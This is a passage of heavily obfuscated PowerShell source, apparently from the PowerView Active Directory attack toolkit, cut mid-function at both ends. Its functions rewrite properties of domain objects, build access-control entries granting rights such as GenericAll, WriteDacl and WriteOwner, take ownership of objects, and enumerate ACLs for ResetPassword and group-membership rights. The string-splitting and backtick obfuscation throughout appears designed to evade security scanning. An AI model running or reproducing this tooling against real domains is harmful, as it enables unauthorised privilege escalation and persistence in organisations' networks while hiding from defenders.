        [Alias( {"{2}{1}{0}{3}"-f'tro','ainCon','Dom','ller'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}"-f'e','Bas'}, {"{1}{0}" -f'Level','One'}, {"{1}{0}" -f'tree','Sub'}  )]
        [String]
        $SearchScope  = (  "{2}{1}{0}"-f 'e','e','Subtr' ),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(    )]
        $Credential   =   [Management.Automation.PSCredential]::EMpTY
      )

    BEGIN {
        $SearcherArguments  =  @{'Raw'  = $True}
        if ($PSBoundParameters[(  "{1}{2}{0}" -f'in','Dom','a' )]  ) { $SearcherArguments[("{1}{2}{0}"-f'ain','Do','m' )]  =  $Domain }
        if ($PSBoundParameters[("{1}{2}{0}" -f'APFilter','L','D')] ) { $SearcherArguments[( "{1}{2}{0}" -f'er','LDAPFi','lt'  )] =  $LDAPFilter }
        if ( $PSBoundParameters[("{2}{0}{1}"-f 'rchBa','se','Sea' )]  ) { $SearcherArguments[( "{2}{0}{1}"-f 'rch','Base','Sea')] =   $SearchBase }
        if ($PSBoundParameters[("{1}{0}" -f 'er','Serv')]) { $SearcherArguments[("{1}{0}" -f 'r','Serve')] =  $Server }
        if ( $PSBoundParameters[(  "{0}{2}{1}"-f'S','pe','earchSco'  )]  ) { $SearcherArguments[("{0}{2}{1}{3}"-f 'Sear','h','c','Scope' )] =   $SearchScope }
        if (  $PSBoundParameters[(  "{2}{1}{3}{0}"-f'ize','P','Result','ageS')] ) { $SearcherArguments[("{4}{3}{1}{2}{0}"-f 'eSize','t','Pag','l','Resu'  )] = $ResultPageSize }
        if (  $PSBoundParameters[( "{4}{0}{3}{2}{1}"-f 'rverTi','t','i','meLim','Se' )] ) { $SearcherArguments[(  "{2}{0}{1}{3}"-f'rve','rT','Se','imeLimit')]  = $ServerTimeLimit }
        if ($PSBoundParameters[("{0}{1}"-f'Tombston','e' )]  ) { $SearcherArguments[(  "{1}{2}{0}"-f 'e','To','mbston')]  =  $Tombstone }
        if ( $PSBoundParameters[("{0}{2}{1}"-f 'Cre','ntial','de'  )] ) { $SearcherArguments[( "{2}{0}{1}"-f 'den','tial','Cre')] =   $Credential }
    }

    PROCESS {
        if ( $PSBoundParameters[("{2}{1}{0}"-f'ity','nt','Ide'  )]) { $SearcherArguments[( "{0}{1}"-f'Identi','ty')]  = $Identity }

        
        $RawObject   =   Get-DomainObject @SearcherArguments

        ForEach ( $Object in $RawObject) {

            $Entry   =  $RawObject.GeTdIreCtORyentRy(  )

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GEtEnUMEraTOR(  )   |  ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.PUT(  $_.nAMe, $_.VALUE  )
                    }
                    $Entry.comMitChAnGEs(    )
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters['XOR'] ) {
                try {
                    $PSBoundParameters['XOR'].GetENUmeRaTor( ) | ForEach-Object {
                        $PropertyName =   $_.naME
                        $PropertyXorValue  = $_.vaLue
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)' "
                        $TypeName =   $Entry.$PropertyName[0].gEtTYPE(    ).naMe

                        
                        $PropertyValue =  $($Entry.$PropertyName  ) -bxor $PropertyXorValue
                        $Entry.$PropertyName  =   $PropertyValue -as $TypeName
                    }
                    $Entry.comMItChANGEs(  )
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
            if($PSBoundParameters[("{0}{1}" -f'Clea','r' )]) {
                try {
                    $PSBoundParameters[("{0}{1}" -f'Cle','ar'  )]   |   ForEach-Object {
                        $PropertyName   =  $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)' "
                        $Entry.$PropertyName.ClEar( )
                    }
                    $Entry.COmMitChANgES()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_ "
                }
            }
        }
    }
}


function cOn`VERtF`RoM-LDA`PlOG`O`NHOU`Rs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{6}{2}{3}{0}{8}{4}{7}{1}{5}" -f'redVarsMor','ssignm','s','eDecla','Tha','ents','PSU','nA','e'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}" -f 'rocess','uldP','ho','PSS'}, '' )]
    [OutputType(  {"{3}{2}{1}{0}" -f 'rs','u','w.LogonHo','PowerVie'}  )]
    [CmdletBinding(  )]
    Param (  
        [Parameter(   vAlUEfRompiPeLIne   =   $True, vaLueFROMPipelInEbYprOpertYNAme  =  $True )]
        [ValidateNotNullOrEmpty( )]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if(  $LogonHoursArray.coUnt -ne 21 ) {
            throw ( "{3}{6}{2}{7}{5}{1}{0}{4}"-f 'ect len','s the incorr','onHours','Lo','gth','y i','g','Arra')
        }

        function C`onV`erTto`-lOGoNH`O`URsaRR`Ay {
            Param (  
                [int[]]
                $HoursArr
             )

            $LogonHours  =   New-Object (  'b'  + 'ool[]' ) 24
            for($i  =0  ;   $i -lt 3  ;  $i++) {
                $Byte = $HoursArr[$i]
                $Offset   = $i * 8
                $Str =   [Convert]::TostriNG($Byte,2  ).PAdleft(8,'0'  )

                $LogonHours[$Offset  +  0]  =  [bool] [convert]::tOint32(  [string]$Str[7]  )
                $LogonHours[$Offset  +1]   =   [bool] [convert]::ToInt32(  [string]$Str[6] )
                $LogonHours[$Offset +  2] =  [bool] [convert]::tOInT32([string]$Str[5]  )
                $LogonHours[$Offset+3]  = [bool] [convert]::toint32([string]$Str[4] )
                $LogonHours[$Offset+ 4]   =  [bool] [convert]::toINT32([string]$Str[3]  )
                $LogonHours[$Offset  + 5]  = [bool] [convert]::tOiNt32([string]$Str[2] )
                $LogonHours[$Offset  +6] =  [bool] [convert]::tOint32(  [string]$Str[1] )
                $LogonHours[$Offset  + 7] =   [bool] [convert]::TOINT32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output  =  @{
            sunDAY   =   ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            mONdAY  = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            TUEsdAY =  ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            WEDneSdaY   =  ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            ThURS   =   ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            frIday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            SatuRdAy   =   ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output =  New-Object ('PS' + 'Obje'  +  'ct' ) -Property $Output
        $Output.PSoBjECt.typEnaMES.iNSERT(0, ( "{1}{3}{2}{5}{0}{4}" -f'nH','Power','w.L','Vie','ours','ogo') )
        $Output
    }
}


function NE`W-adO`BJECTaCCE`S`S`CoNtr`oL`EnTRY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{12}{6}{4}{0}{7}{5}{3}{2}{10}{8}{11}{9}{1}"-f 'ForS','s','angi','Ch','cess','te','uldPro','ta','t','n','ngFunc','io','PSUseSho'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{2}{0}{3}{1}" -f'S','cess','PS','houldPro'}, ''  )]
    [OutputType(  {"{5}{7}{1}{9}{0}{6}{2}{3}{8}{4}{10}" -f 'Ac','em.S','s','Contro','tionRu','Sy','ces','st','l.Authoriza','ecurity.','le'}  )]
    [CmdletBinding(   )]
    Param ( 
        [Parameter(pOsItIon   =  0, ValuEFroMPIPeLINe   = $True, vaLuEFROMPiPELiNeBYpROPeRtYNAmE =  $True, mAnDatOry   =   $True )]
        [Alias(  {"{0}{2}{1}{3}{4}"-f 'D','st','i','inguishedNam','e'}, {"{1}{4}{0}{3}{2}"-f 'u','Sa','ame','ntN','mAcco'}, {"{1}{0}" -f'e','Nam'}  )]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{0}{3}{1}{4}{2}"-f 'Domai','on','oller','nC','tr'}  )]
        [String]
        $Server,

        [ValidateSet(  {"{1}{0}" -f 'se','Ba'}, {"{1}{2}{0}"-f'vel','One','Le'}, {"{0}{2}{1}" -f'Su','ee','btr'} )]
        [String]
        $SearchScope =   (  "{1}{0}{2}"-f're','Subt','e' ),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize  = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential  =   [Management.Automation.PSCredential]::EmPty,

        [Parameter(  mandaTory  =   $True)]
        [ValidateSet({"{1}{3}{4}{0}{5}{2}"-f 'Sys','Ac','Security','ces','s','tem'}, {"{0}{2}{1}"-f'Create','ild','Ch'},{"{1}{0}" -f'e','Delet'},{"{2}{1}{0}" -f 'teChild','e','Del'},{"{2}{0}{3}{1}"-f 'le','Tree','De','te'},{"{0}{1}{2}" -f'Extend','edRi','ght'},{"{2}{1}{3}{0}" -f'l','eneri','G','cAl'},{"{3}{4}{1}{0}{2}" -f'ut','ericExec','e','Ge','n'},{"{2}{1}{0}"-f'ad','ricRe','Gene'},{"{0}{1}{2}{3}"-f 'Gen','ericWri','t','e'},{"{1}{2}{0}" -f'Children','Lis','t'},{"{0}{1}{2}" -f 'L','istObj','ect'},{"{2}{1}{0}{3}" -f 'dCo','ea','R','ntrol'},{"{1}{0}{2}{3}"-f 'p','ReadPro','ert','y'},{"{1}{0}"-f'lf','Se'},{"{2}{0}{1}" -f 'hron','ize','Sync'},{"{1}{0}{2}"-f'iteDa','Wr','cl'},{"{0}{2}{1}"-f 'Write','r','Owne'},{"{0}{3}{4}{1}{2}"-f 'Wr','o','perty','iteP','r'}  )]
        $Right,

        [Parameter(MAnDaTory  =   $True, PArAMeTERseTNAMe  = "ac`CEs`sRUl`e`TYPe"  )]
        [ValidateSet(  {"{1}{0}"-f'low','Al'}, {"{1}{0}" -f'y','Den'}  )]
        [String[]]
        $AccessControlType,

        [Parameter( MaNDaTORY   = $True, paraMeTeRsetNAMe=  "AuDi`T`RU`LETYpE")]
        [ValidateSet(  {"{2}{0}{1}"-f 'e','ss','Succ'}, {"{0}{1}"-f'Fail','ure'} )]
        [String]
        $AuditFlag,

        [Parameter(MAnDAToRY  = $False, pARAmetERSetnaME =  "AccE`S`srULeType" )]
        [Parameter(  MandAtoRy  =   $False, PaRAmEteRseTnAmE= "au`ditr`ULEtY`PE"  )]
        [Parameter(  manDatoRY  =   $False, ParAMeteRSeTnAME =  "oBJ`eC`T`GuIDLookup" )]
        [Guid]
        $ObjectType,

        [ValidateSet( 'All', {"{0}{1}{2}" -f 'C','hildr','en'},{"{2}{1}{0}" -f's','scendent','De'},{"{0}{1}" -f 'No','ne'},{"{4}{1}{0}{3}{2}" -f'f','l','ndChildren','A','Se'} )]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
     )

    Begin {
        if (  $PrincipalIdentity -notmatch ("{0}{1}" -f '^S','-1-.*'  )) {
            $PrincipalSearcherArguments = @{
                ( "{0}{1}" -f'I','dentity' )   =   $PrincipalIdentity
                ("{2}{0}{1}" -f 'er','ties','Prop')  = (  "{5}{2}{3}{0}{4}{1}" -f'obj','ctsid','a','me,','e','distinguishedn'  )
            }
            if ($PSBoundParameters[( "{2}{0}{3}{1}"-f'rin','main','P','cipalDo'  )] ) { $PrincipalSearcherArguments[( "{0}{1}{2}" -f 'Dom','ai','n')] =   $PrincipalDomain }
            if ($PSBoundParameters[("{2}{0}{1}"-f'r','ver','Se' )]) { $PrincipalSearcherArguments[( "{1}{2}{0}"-f 'ver','S','er'  )]   =   $Server }
            if ($PSBoundParameters[(  "{0}{1}{2}"-f 'Searc','hSco','pe')] ) { $PrincipalSearcherArguments[("{1}{0}{2}"-f 'ch','Sear','Scope' )]   =   $SearchScope }
            if (  $PSBoundParameters[("{2}{0}{4}{1}{3}"-f 'P','eSiz','Result','e','ag')] ) { $PrincipalSearcherArguments[("{2}{1}{0}" -f'tPageSize','ul','Res')]  =   $ResultPageSize }
            if (  $PSBoundParameters[(  "{0}{1}{2}{3}"-f 'ServerTimeL','i','mi','t' )] ) { $PrincipalSearcherArguments[(  "{1}{0}{2}{3}" -f'r','Se','verTi','meLimit'  )]   =   $ServerTimeLimit }
            if ( $PSBoundParameters[( "{1}{0}{2}"-f 'ombsto','T','ne'  )]) { $PrincipalSearcherArguments[( "{2}{0}{1}" -f'om','bstone','T' )] = $Tombstone }
            if ($PSBoundParameters[(  "{2}{0}{1}"-f 're','dential','C' )] ) { $PrincipalSearcherArguments[(  "{0}{2}{1}" -f 'Cred','tial','en')] =  $Credential }
            $Principal  =  Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal  ) {
                throw ('U' +'nabl'+  'e '+  'to'+' ' +'resolv'  +'e'+' ' +'pri'  + 'nc'  +'ip'  +'al: '  +"$PrincipalIdentity")
            }
            elseif($Principal.cOUNt -gt 1) {
                throw (  "{5}{2}{8}{10}{3}{4}{0}{9}{1}{11}{12}{6}{7}"-f'tiple ','ut onl','ip','enti','ty matches mul','Princ','ow','ed','al','AD objects, b','Id','y one is al','l'  )
            }
            $ObjectSid = $Principal.oBjECTsiD
        }
        else {
            $ObjectSid =   $PrincipalIdentity
        }

        $ADRight = 0
        foreach( $r in $Right  ) {
            $ADRight = $ADRight -bor ( ([System.DirectoryServices.ActiveDirectoryRights]$r).VALuE__ )
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity =  [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid )
    }

    Process {
        if( $PSCmdlet.pAraMeTERSetnaMe -eq ( "{1}{2}{0}"-f'itRuleType','Au','d' )) {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::eMPTy -and $InheritedObjectType -eq $null) {
                New-Object (  'Syste'+'m.D'  + 'ir'  +'ecto'+ 'ry'  +'Servi' + 'ce' +  's' +  '.Ac' +'ti'+  'veD' +  'irector'+ 'yAuditR' +  'ul'  +  'e') -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif( $ObjectType -eq $null -and $InheritanceType -ne [String]::eMpTy -and $InheritedObjectType -eq $null) {
                New-Object (  'S' +'y' +  'stem.Direct'  +'or' +  'ySe'  +  'r'+ 'v'  +'ices.Acti'+'veDire'+'cto'+'ry'  +  'AuditRule') -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType )
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::EMPTY -and $InheritedObjectType -ne $null) {
                New-Object ('Sy'  +'ste'+ 'm' + '.Di'  +'rectory' +'S'+'erv'  +  'i'  + 'ces'+'.Acti'+'ve'  +  'Direct'  + 'or' +'yAu'  +  'ditRule' ) -ArgumentList $Identity, $ADRight, $AuditFlag, ( [System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType  ), $InheritedObjectType
            } elseif(  $ObjectType -ne $null -and $InheritanceType -eq [String]::emPTy -and $InheritedObjectType -eq $null) {
                New-Object ('Sy'  + 'stem'  + '.' +  'D'+  'i' +  're'  +  'ct'  +  'or'  + 'yServices.A'+  'ct' +'iv' +'eDir'+'ectoryAudit'  + 'Rule' ) -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::eMPTy -and $InheritedObjectType -eq $null ) {
                New-Object ( 'System.D'+'i'+'r' + 'ect' +'oryServices.ActiveDi' +  'rector'  +  'yAu'  +'d'  +  'itR'  +'u' + 'le' ) -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif( $ObjectType -ne $null -and $InheritanceType -ne [String]::EMpty -and $InheritedObjectType -ne $null  ) {
                New-Object ('Sys'+  'tem.Director' + 'y'  +'Serv'  +'ic'  + 'es.Active'+'Di'  +'re'  +  'ct'  +  'oryAuditRule'  ) -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if(  $ObjectType -eq $null -and $InheritanceType -eq [String]::EMPTy -and $InheritedObjectType -eq $null) {
                New-Object (  'System.Di'  +'r'+'ecto' +  'ryServi' +'ces.Acti' +'v' + 'eDirectory'  + 'Acce' + 'ssRule') -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif( $ObjectType -eq $null -and $InheritanceType -ne [String]::eMpTy -and $InheritedObjectType -eq $null) {
                New-Object ( 'Sys' +  'tem.Di'+'re' + 'ctory'  +'Services.A' + 'ctiveDirecto' +  'ry'  + 'A'  + 'ccessRu' + 'l'  +  'e') -ArgumentList $Identity, $ADRight, $AccessControlType, (  [System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType )
            } elseif( $ObjectType -eq $null -and $InheritanceType -ne [String]::EMPTY -and $InheritedObjectType -ne $null  ) {
                New-Object (  'Sy'  +  's' + 'tem.Dir'+  'ect'+ 'or' +  'ySe'+  'rv'  +'ices.Activ' +'eDi'  +'rect'  + 'oryAcc'+'essRul'+'e' ) -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType  ), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::eMPTY -and $InheritedObjectType -eq $null ) {
                New-Object ( 'S' + 'ystem.Dir'+'e' +  'c'+ 't'  +'oryServices.ActiveD'  +'ir'  +'e'+ 'ctoryAcce' + 'ssRul' + 'e') -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif(  $ObjectType -ne $null -and $InheritanceType -ne [String]::EmpTY -and $InheritedObjectType -eq $null) {
                New-Object ('S'  +'ystem.DirectoryServi'  + 'ces.' +'ActiveD'+'i' + 'rectoryAcce' + 'ss'  + 'Rul'+  'e' ) -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif( $ObjectType -ne $null -and $InheritanceType -ne [String]::EmPty -and $InheritedObjectType -ne $null) {
                New-Object ('Sy'  +'stem'+ '.Direct' + 'o'  +  'ryServic' +  'e'+ 's.Activ'  +'eDirector'  +  'yAc'  + 'ce'+  's'  +  's'  +'Rule') -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function S`ET`-doma`iNoB`jEcTow`NEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{6}{0}{3}{12}{10}{2}{7}{8}{9}{5}{4}{11}" -f 'seS','PS','oce','h','ngingFunct','rStateCha','U','ss','F','o','Pr','ions','ould'}, ''  )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{3}{2}{1}" -f'PSShoul','cess','Pro','d'}, '')]
    [CmdletBinding(  )]
    Param(  
        [Parameter( PosITioN = 0, MAnDaToRy   =   $True, vAlUeFrompipelIne  =   $True, VAluEFromPiPELiNEByPROPErtynaMe  =  $True)]
        [Alias(  {"{0}{3}{1}{4}{2}"-f'Di','d','me','stinguishe','Na'}, {"{0}{3}{4}{1}{2}" -f'SamA','Na','me','cco','unt'}, {"{0}{1}"-f'Nam','e'}  )]
        [String]
        $Identity,

        [Parameter(  MandatORY  =  $True)]
        [ValidateNotNullOrEmpty(    )]
        [Alias(  {"{0}{1}"-f'Owne','r'} )]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty( )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{1}{0}"-f'ilter','F'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{0}{1}"-f'AD','SPath'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{3}{4}{1}{2}"-f 'DomainC','rol','ler','on','t'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{0}{1}" -f 'OneLeve','l'}, {"{2}{0}{1}"-f'btre','e','Su'})]
        [String]
        $SearchScope =  ( "{0}{1}" -f 'Subtr','ee'),

        [ValidateRange(  1, 10000  )]
        [Int]
        $ResultPageSize =   200,

        [ValidateRange(1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =   [Management.Automation.PSCredential]::emptY
    )

    BEGIN {
        $SearcherArguments =   @{}
        if ($PSBoundParameters[("{0}{2}{1}"-f 'Dom','n','ai' )] ) { $SearcherArguments[( "{1}{0}" -f 'ain','Dom')]   =  $Domain }
        if (  $PSBoundParameters[(  "{2}{1}{0}" -f'Filter','DAP','L' )]  ) { $SearcherArguments[("{0}{2}{1}" -f'L','APFilter','D' )]   = $LDAPFilter }
        if ( $PSBoundParameters[(  "{0}{1}{2}" -f'S','earchB','ase'  )]  ) { $SearcherArguments[("{0}{1}{2}" -f'Sea','r','chBase')]  = $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}" -f'Se','rver'  )]) { $SearcherArguments[("{1}{0}"-f 'er','Serv' )] =   $Server }
        if ( $PSBoundParameters[("{0}{1}{3}{2}"-f 'S','ear','cope','chS'  )]) { $SearcherArguments[("{0}{2}{1}" -f 'SearchS','pe','co' )]  = $SearchScope }
        if ($PSBoundParameters[( "{0}{2}{1}"-f 'Re','ze','sultPageSi' )]) { $SearcherArguments[("{0}{1}{2}" -f 'Re','sultPageSiz','e')]  =   $ResultPageSize }
        if (  $PSBoundParameters[( "{1}{2}{0}"-f 'it','S','erverTimeLim')]  ) { $SearcherArguments[("{0}{4}{3}{2}{1}"-f 'Serve','t','Limi','Time','r')]  =   $ServerTimeLimit }
        if ( $PSBoundParameters[("{0}{2}{1}"-f'Tom','e','bston' )]) { $SearcherArguments[(  "{1}{2}{0}"-f 'bstone','T','om' )]   = $Tombstone }
        if ( $PSBoundParameters[(  "{2}{0}{3}{1}"-f'den','ial','Cre','t' )] ) { $SearcherArguments[("{1}{2}{0}" -f'ential','C','red')] =  $Credential }

        $OwnerSid =   Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties ( 'o'+ 'bje'  +  'ctsid'  )  |   Select-Object -ExpandProperty ( 'obj'  +  'ect'  +'sid')
        if ($OwnerSid) {
            $OwnerIdentityReference  =  [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning ( '[Set-D' + 'oma'+'i' +'nO'  + 'bje' + 'ctOwner]' + ' '  +  'Er' + 'ror '  + 'p'+  'ar'  +'sing '+'owner' +  ' '  + 'i'+  'dentity' + ' '  +  "'$OwnerIdentity'" )
        }
    }

    PROCESS {
        if (  $OwnerIdentityReference) {
            $SearcherArguments['Raw']   =  $True
            $SearcherArguments[( "{0}{1}{2}"-f'Iden','tit','y' )]  = $Identity

            
            $RawObject  =   Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose ( '[Set-Dom' +'ai'+  'n'+'Ob'+ 'j' + 'ect'  + 'Owner' +'] '+ 'Attemp' +  't'  + 'ing' +  ' '+  't'+'o '  + 'se'  +  't '+ 'the'+  ' ' + 'o'+ 'wner '+  'f'  +  'or '+"'$Identity' "  +  'to' +  ' ' + "'$OwnerIdentity'")
                    $Entry  = $RawObject.GeTDIreCTorYEntry(   )
                    $Entry.psBaSE.optIoNs.SEcUriTYMaSKS   =  ("{1}{0}" -f'wner','O'  )
                    $Entry.PSBase.oBJectSEcuriTy.sEtOwNer( $OwnerIdentityReference  )
                    $Entry.PsBaSE.COMmITchAnGES(  )
                }
                catch {
                    Write-Warning ('[Se' + 't-D' +  'oma'+ 'inO'  + 'bje'+'ctOw' + 'ner] '  +'Err'+  'or' +  ' ' + 'sett'  + 'in'+'g ' +'owner:'+' '+ "$_")
                }
            }
        }
    }
}


function gE`T-`D`OMAiN`Ob`jEctAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{4}{0}"-f 'ess','P','houldPr','SS','oc'}, ''  )]
    [OutputType( {"{0}{1}{2}{4}{3}" -f 'Po','werV','i','L','ew.AC'})]
    [CmdletBinding(   )]
    Param ( 
        [Parameter(pOSitiON  = 0, ValUeFROmPIPElInE  = $True, vALUeFRoMPIPElInebyPrOpertYNAME =  $True )]
        [Alias({"{3}{4}{2}{0}{1}" -f 'am','e','N','Di','stinguished'}, {"{2}{0}{3}{1}{4}" -f 'am','countNam','S','Ac','e'}, {"{1}{0}"-f'me','Na'}  )]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias(  {"{1}{0}" -f'ts','Righ'}  )]
        [ValidateSet( 'All', {"{0}{1}{3}{2}" -f 'R','ese','rd','tPasswo'}, {"{2}{0}{1}" -f 'mb','ers','WriteMe'})]
        $RightsFilter,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{1}"-f'Fi','lter'} )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{0}{1}" -f'AD','SPath'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{0}{1}{2}" -f 'DomainCon','tr','oller'} )]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}" -f'e','OneL','vel'}, {"{2}{0}{1}"-f'btre','e','Su'} )]
        [String]
        $SearchScope =   (  "{1}{2}{0}"-f'tree','S','ub'),

        [ValidateRange( 1, 10000 )]
        [Int]
        $ResultPageSize =  200,

        [ValidateRange( 1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(    )]
        $Credential =   [Management.Automation.PSCredential]::EMPtY
    )

    BEGIN {
        $SearcherArguments  =  @{
            ( "{1}{2}{0}" -f 'perties','Pr','o'  ) =   ( "{6}{8}{3}{2}{1}{4}{0}{9}{7}{5}"-f'in','cur','e','s','itydescriptor,dist','bjectsid','samaccountna',',o','me,nt','guishedname' )
        }

        if (  $PSBoundParameters[(  "{0}{1}" -f'S','acl' )] ) {
            $SearcherArguments[("{0}{2}{3}{1}" -f'Secur','ks','ityMa','s')]   =  ( "{1}{0}"-f 'l','Sac' )
        }
        else {
            $SearcherArguments[( "{0}{2}{1}"-f'Secur','sks','ityMa' )]   =   ( "{1}{0}"-f 'acl','D')
        }
        if (  $PSBoundParameters[("{1}{0}"-f 'omain','D' )]  ) { $SearcherArguments[( "{1}{0}"-f'main','Do'  )]   =   $Domain }
        if ( $PSBoundParameters[("{3}{1}{2}{0}" -f'se','rc','hBa','Sea' )] ) { $SearcherArguments[("{1}{0}{2}" -f 'hB','Searc','ase'  )]  =   $SearchBase }
        if (  $PSBoundParameters[( "{0}{1}{2}"-f 'S','erve','r')] ) { $SearcherArguments[( "{0}{1}"-f 'Serve','r'  )]  =  $Server }
        if ( $PSBoundParameters[( "{2}{0}{1}"-f 'chScop','e','Sear'  )]  ) { $SearcherArguments[("{0}{2}{1}{3}" -f'Sear','hSco','c','pe')] =  $SearchScope }
        if ( $PSBoundParameters[( "{3}{0}{1}{2}{4}"-f'sult','Pag','eSi','Re','ze')]) { $SearcherArguments[( "{1}{3}{4}{0}{2}" -f'g','Re','eSize','su','ltPa')]   = $ResultPageSize }
        if ($PSBoundParameters[(  "{4}{2}{0}{1}{3}" -f 'imeLi','m','rverT','it','Se'  )]  ) { $SearcherArguments[("{0}{1}{4}{3}{2}"-f'S','erverTim','t','mi','eLi'  )]  =  $ServerTimeLimit }
        if ($PSBoundParameters[(  "{1}{2}{0}{3}" -f'n','Tom','bsto','e')] ) { $SearcherArguments[( "{1}{2}{0}" -f'e','Tombs','ton'  )] = $Tombstone }
        if ($PSBoundParameters[( "{0}{2}{1}"-f'C','al','redenti' )]  ) { $SearcherArguments[("{2}{1}{0}"-f'ial','t','Creden')] =   $Credential }
        $Searcher   = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments  =   @{}
        if (  $PSBoundParameters[("{1}{0}" -f 'ain','Dom' )] ) { $DomainGUIDMapArguments[(  "{2}{0}{1}"-f 'i','n','Doma')]  =  $Domain }
        if ( $PSBoundParameters[(  "{1}{0}{2}" -f'erve','S','r')] ) { $DomainGUIDMapArguments[(  "{1}{0}" -f 'r','Serve'  )]   =   $Server }
        if (  $PSBoundParameters[( "{0}{3}{1}{2}{4}" -f 'Re','ult','Pa','s','geSize'  )]  ) { $DomainGUIDMapArguments[( "{0}{3}{1}{2}"-f 'ResultP','eSi','ze','ag'  )] =   $ResultPageSize }
